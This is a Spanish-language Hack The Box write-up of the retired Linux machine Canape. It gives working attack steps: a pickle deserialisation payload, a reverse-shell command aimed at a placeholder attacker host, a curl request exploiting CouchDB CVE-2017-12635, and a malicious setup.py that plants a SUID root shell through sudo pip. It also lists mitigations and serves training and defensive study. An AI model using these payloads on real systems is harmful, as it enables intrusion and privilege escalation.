---
machine: Canape
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, git, pickle, couchdb, privesc]
---

# Canape — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El sitio expone su repositorio `.git`, que revela una aplicación Flask con un `cPickle.loads` sobre archivos subidos. Se serializa un objeto con `__reduce__` para ejecutar comandos y se obtiene `www-data`. CouchDB solo escucha en localhost y es vulnerable a CVE-2017-12635: se crea un administrador con roles duplicados, se leen credenciales y se entra como `homer`. `sudo pip install *` permite ejecutar un `setup.py` malicioso como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p80,65535 <IP>
```

- `80/tcp` sirve un sitio de fans de Los Simpsons y `65535/tcp` es SSH.
- El escaneo de scripts detecta `/.git/` expuesto.
- `wget --mirror -I .git` recupera el repositorio y `git checkout -- .` reconstruye el código.

## Enumeración

- La aplicación Flask guarda en `/tmp/<md5>.p` la concatenación de `character` y `quote`.
- `/check` lee el archivo y, si contiene `p1`, llama a `cPickle.loads`.
- CouchDB escucha en `127.0.0.1:5984` y guarda citas y contraseñas.

## Foothold

Se crea una clase con `__reduce__` que devuelve `os.system`, se serializa con `cPickle`, se parte en `character`/`quote` para pasar la whitelist y se envía a `/submit`; después se invoca `/check`.

```python
class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))
```

```bash
python2 get_canape_shell.py <ATTACKER> 4444
```

## Movimiento lateral

Con `www-data` se consulta CouchDB. La base `passwords` no es accesible, pero CVE-2017-12635 permite registrarse como administrador enviando dos claves `roles`; el validador JavaScript ve una y Erlang conserva la otra.

```bash
curl -X PUT -d '{"type":"user","name":"<USER>","roles":["_admin"],"roles":[],"password":"<PASSWORD>"}' http://localhost:5984/_users/org.couchdb.user:<USER>
```

Se leen las credenciales de SSH y se entra como `homer` por el puerto 65535.

## Escalada de privilegios

`homer` puede ejecutar `pip install *` como root. Un `setup.py` con una clase `install` personalizada ejecuta código durante la instalación.

```python
from setuptools import setup
from setuptools.command.install import install

class Exploit(install):
    def run(self):
        import os
        os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")

setup(cmdclass={"install": Exploit})
```

```bash
sudo pip install .
/tmp/rootbash -p
```

## Evidencia

- Repositorio `.git` y código de `/submit` y `/check`.
- Pickle malicioso y shell como `www-data`.
- CVE-2017-12635 y credenciales de `homer`.
- `setup.py` ejecutado por `pip` con privilegios.

## Lecciones aprendidas

- Un `.git` expuesto entrega el código y la lógica de una aplicación.
- Deserializar datos de usuario con pickle permite ejecución directa.
- Las dependencias instaladas con privilegios ejecutan código de `setup.py`.

## Mitigación y detección

- No publicar `.git` y revisar el contenido antes de desplegar.
- Sustituir pickle por JSON y validar el tipo de dato.
- No permitir que un usuario sin privilegios instale paquetes como root.

## Referencias

- [0xdf — Canape](https://0xdf.gitlab.io/2018/09/15/htb-canape.html)
- [IppSec — Canape](https://www.youtube.com/watch?v=rs75y2qPonc)
- [Hack The Box — Canape](https://app.hackthebox.com/machines/canape)
